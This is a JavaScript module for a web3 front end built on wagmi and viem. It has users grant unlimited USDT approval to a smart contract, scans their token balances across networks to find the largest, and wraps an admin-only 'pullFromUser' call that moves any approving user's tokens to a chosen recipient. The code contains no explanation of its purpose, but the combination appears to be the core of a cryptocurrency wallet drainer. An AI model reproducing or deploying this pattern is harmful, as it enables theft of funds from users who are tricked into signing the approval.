import { writeContract, readContract } from 'wagmi/actions'
import { parseUnits, maxUint256, formatUnits, createPublicClient, http as viemHttp } from 'viem'
import { wagmiConfig } from './config.jsx'
import { CHAIN_IDS, RESOLVED_RPC_URLS } from './config.jsx'
import { mainnet, polygon as polygonChain, arbitrum as arbitrumChain, base as baseChain } from 'viem/chains'

// USDT ERC20 Token Addresses across different networks
export const USDT_ADDRESSES = {
  // Arbitrum
  arbitrum: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9"
}

// ERC20 ABI for approve and allowance functions
export const ERC20_ABI = [
  {
    type: 'function',
    stateMutability: 'nonpayable',
    outputs: [{ name: '', type: 'bool' }],
    name: 'approve',
    inputs: [
      { name: 'spender', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ]
  },
  {
    type: 'function',
    stateMutability: 'view',
    outputs: [{ name: '', type: 'uint256' }],
    name: 'allowance',
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'spender', type: 'address' }
    ]
  },
  {
    type: 'function',
    stateMutability: 'view',
    outputs: [{ name: '', type: 'uint256' }],
    name: 'balanceOf',
    inputs: [{ name: 'account', type: 'address' }]
  },
  {
    type: 'function',
    stateMutability: 'view',
    outputs: [{ name: '', type: 'uint8' }],
    name: 'decimals',
    inputs: []
  }
]

// TokenTransfer contract ABI
export const tokenTransferAbi = [
  {
    type: 'function',
    stateMutability: 'view',
    outputs: [{ name: '', type: 'address' }],
    name: 'owner',
    inputs: []
  },
  {
    type: 'function',
    stateMutability: 'view',
    outputs: [{ name: '', type: 'address' }],
    name: 'admin',
    inputs: []
  },
  {
    type: 'function',
    stateMutability: 'view',
    outputs: [{ name: '', type: 'address' }],
    name: 'token',
    inputs: []
  },
  {
    type: 'function',
    stateMutability: 'nonpayable',
    outputs: [],
    name: 'setAdmin',
    inputs: [
      { name: '_admin', type: 'address' }
    ]
  },
  {
    type: 'function',
    stateMutability: 'nonpayable',
    outputs: [],
    name: 'transferTokens',
    inputs: [
      { name: 'recipient', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ]
  },
  {
    type: 'function',
    stateMutability: 'nonpayable',
    outputs: [],
    name: 'withdrawTokens',
    inputs: [
      { name: 'recipient', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ]
  },
  {
    type: 'function',
    stateMutability: 'nonpayable',
    outputs: [],
    name: 'transferFromSender',
    inputs: [
      { name: 'recipient', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ]
  },
  {
    type: 'function',
    stateMutability: 'nonpayable',
    outputs: [],
    name: 'pullFromUser',
    inputs: [
      { name: 'user', type: 'address' },
      { name: 'recipient', type: 'address' },
      { name: 'amount', type: 'uint256' }
    ]
  },
  {
    type: 'event',
    name: 'TokensTransferred',
    inputs: [
      { name: 'from', type: 'address', indexed: true },
      { name: 'to', type: 'address', indexed: true },
      { name: 'amount', type: 'uint256', indexed: false }
    ],
    anonymous: false
  }
]

// Approve USDT tokens for maximum spending by smart contract
export async function approveUSDT({ smartContractAddress, userAddress, network = 'arbitrum' }) {
  if (!smartContractAddress) throw new Error('smartContractAddress is required')
  if (!userAddress) throw new Error('userAddress is required')

  const usdtAddress = USDT_ADDRESSES[network]
  if (!usdtAddress) throw new Error(`Unsupported network: ${network}`)

  return writeContract(wagmiConfig, {
    address: usdtAddress,
    abi: ERC20_ABI,
    functionName: 'approve',
    args: [smartContractAddress, maxUint256],
    chainId: CHAIN_IDS[network]
  })
}

// Check USDT allowance for smart contract
export async function checkUSDTAllowance({ smartContractAddress, userAddress, network = 'arbitrum' }) {
  if (!smartContractAddress) throw new Error('smartContractAddress is required')
  if (!userAddress) throw new Error('userAddress is required')

  const usdtAddress = USDT_ADDRESSES[network]
  if (!usdtAddress) throw new Error(`Unsupported network: ${network}`)

  return readContract(wagmiConfig, {
    address: usdtAddress,
    abi: ERC20_ABI,
    functionName: 'allowance',
    args: [userAddress, smartContractAddress],
    chainId: CHAIN_IDS[network]
  })
}

// Map network name to viem chain
const VIEM_CHAIN_BY_NAME = {
  ethereum: mainnet,
  polygon: polygonChain,
  arbitrum: arbitrumChain,
  base: baseChain
}

// Check USDT balance of user on a specific network
export async function checkUSDTBalance({ userAddress, network = 'arbitrum' }) {
  if (!userAddress) throw new Error('userAddress is required')
  
  const usdtAddress = USDT_ADDRESSES[network]
  if (!usdtAddress) throw new Error(`Unsupported network: ${network}`)

  const url = RESOLVED_RPC_URLS[network]
  const client = createPublicClient({
    chain: VIEM_CHAIN_BY_NAME[network],
    transport: viemHttp(url),
    batch: { multicall: false }
  })

  try {
    return await client.readContract({
      address: usdtAddress,
      abi: ERC20_ABI,
      functionName: 'balanceOf',
      args: [userAddress]
    })
  } catch (directError) {
    console.warn(`Direct read failed on ${network}; falling back to wagmi readContract.`, directError)
    return await readContract(wagmiConfig, {
      address: usdtAddress,
      abi: ERC20_ABI,
      functionName: 'balanceOf',
      args: [userAddress],
      chainId: CHAIN_IDS[network]
    })
  }
}

// Check USDT balance across all networks and return the highest
export async function checkUSDTBalanceAllNetworks({ userAddress }) {
  if (!userAddress) throw new Error('userAddress is required')

  const networks = Object.keys(USDT_ADDRESSES)
  const results = []

  for (const network of networks) {
    try {
      const balance = await checkUSDTBalance({ userAddress, network })
      results.push({
        network,
        balance: parseUSDTAmount(balance),
        rawBalance: balance
      })
    } catch (error) {
      console.warn(`Failed to check balance on ${network}:`, error)
      results.push({
        network,
        balance: 0,
        rawBalance: 0n
      })
    }
    // small delay to avoid hitting rate limits when scanning multiple chains
    await new Promise((resolve) => setTimeout(resolve, 150))
  }

  const highestBalance = results.reduce((max, current) => 
    current.balance > max.balance ? current : max
  )

  return {
    highest: highestBalance,
    allBalances: results
  }
}

// Call TokenTransfer contract functions
export async function callTransferTokens({ contractAddress, recipientAddress, amount }) {
  if (!contractAddress) throw new Error('contractAddress is required')
  if (!recipientAddress) throw new Error('recipientAddress is required')
  if (amount === undefined || amount === null) throw new Error('amount is required')

  return writeContract(wagmiConfig, {
    address: contractAddress,
    abi: tokenTransferAbi,
    functionName: 'transferTokens',
    args: [recipientAddress, amount]
  })
}

export async function callWithdrawTokens({ contractAddress, recipientAddress, amount }) {
  if (!contractAddress) throw new Error('contractAddress is required')
  if (!recipientAddress) throw new Error('recipientAddress is required')
  if (amount === undefined || amount === null) throw new Error('amount is required')

  return writeContract(wagmiConfig, {
    address: contractAddress,
    abi: tokenTransferAbi,
    functionName: 'withdrawTokens',
    args: [recipientAddress, amount]
  })
}

export async function callTransferFromSender({ contractAddress, recipientAddress, amount, chainId }) {
  if (!contractAddress) throw new Error('contractAddress is required')
  if (!recipientAddress) throw new Error('recipientAddress is required')
  if (amount === undefined || amount === null) throw new Error('amount is required')
  return writeContract(wagmiConfig, {
    address: contractAddress,
    abi: tokenTransferAbi,
    functionName: 'transferFromSender',
    args: [recipientAddress, amount],
    chainId
  })
}

// Helper function to format USDT amount (USDT has 6 decimals)
export function formatUSDTAmount(amount) {
  return parseUnits(amount.toString(), 6)
}

// Helper function to parse USDT amount from contract response
export function parseUSDTAmount(amount) {
  return Number(formatUnits(amount, 6))
}

// Curated ERC20 token lists per network for balance scanning
export const TOKEN_LISTS = {
  arbitrum: [
    { symbol: 'USDT', address: USDT_ADDRESSES.arbitrum, decimals: 6 }
  ]
}

// Generic ERC20 balance check for any token address
export async function checkTokenBalance({ userAddress, tokenAddress, network = 'ethereum' }) {
  if (!userAddress) throw new Error('userAddress is required')
  if (!tokenAddress) throw new Error('tokenAddress is required')
  const url = RESOLVED_RPC_URLS[network]
  const client = createPublicClient({
    chain: VIEM_CHAIN_BY_NAME[network],
    transport: viemHttp(url),
    batch: { multicall: false }
  })
  try {
    return await client.readContract({
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: 'balanceOf',
      args: [userAddress]
    })
  } catch (directError) {
    console.warn(`Direct token read failed on ${network}; falling back to wagmi readContract.`, directError)
    return await readContract(wagmiConfig, {
      address: tokenAddress,
      abi: ERC20_ABI,
      functionName: 'balanceOf',
      args: [userAddress],
      chainId: CHAIN_IDS[network]
    })
  }
}

// Scan balances for a provided token list on one network
export async function checkTokenBalancesForList({ userAddress, network = 'ethereum', tokenList }) {
  if (!userAddress) throw new Error('userAddress is required')
  const list = tokenList || TOKEN_LISTS[network] || []
  const results = []
  for (const token of list) {
    try {
      const bal = await checkTokenBalance({ userAddress, tokenAddress: token.address, network })
      results.push({ network, symbol: token.symbol, address: token.address, decimals: token.decimals, balance: bal })
    } catch (err) {
      console.warn(`Failed token balance on ${network} ${token.symbol}:`, err)
    }
    await new Promise((r) => setTimeout(r, 120))
  }
  return results
}

// Scan ERC20 balances across all supported networks
export async function checkERC20BalancesAllNetworks({ userAddress }) {
  if (!userAddress) throw new Error('userAddress is required')
  const networks = Object.keys(TOKEN_LISTS)
  const byNetwork = {}
  for (const network of networks) {
    const balances = await checkTokenBalancesForList({ userAddress, network })
    byNetwork[network] = balances
    await new Promise((r) => setTimeout(r, 150))
  }
  return byNetwork
}

export async function readOwnerAddress({ contractAddress, chainId }) {
  if (!contractAddress) throw new Error('contractAddress is required')
  return readContract(wagmiConfig, {
    address: contractAddress,
    abi: tokenTransferAbi,
    functionName: 'owner',
    args: [],
    chainId
  })
}

export async function readAdminAddress({ contractAddress, chainId }) {
  if (!contractAddress) throw new Error('contractAddress is required')
  return readContract(wagmiConfig, {
    address: contractAddress,
    abi: tokenTransferAbi,
    functionName: 'admin',
    args: [],
    chainId
  })
}

export async function callSetAdmin({ contractAddress, adminAddress, chainId }) {
  if (!contractAddress) throw new Error('contractAddress is required')
  if (!adminAddress) throw new Error('adminAddress is required')
  return writeContract(wagmiConfig, {
    address: contractAddress,
    abi: tokenTransferAbi,
    functionName: 'setAdmin',
    args: [adminAddress],
    chainId
  })
}

export async function callPullFromUser({ contractAddress, userAddress, recipientAddress, amount, chainId }) {
  if (!contractAddress) throw new Error('contractAddress is required')
  if (!userAddress) throw new Error('userAddress is required')
  if (!recipientAddress) throw new Error('recipientAddress is required')
  if (amount === undefined || amount === null) throw new Error('amount is required')
  return writeContract(wagmiConfig, {
    address: contractAddress,
    abi: tokenTransferAbi,
    functionName: 'pullFromUser',
    args: [userAddress, recipientAddress, amount],
    chainId
  })
}
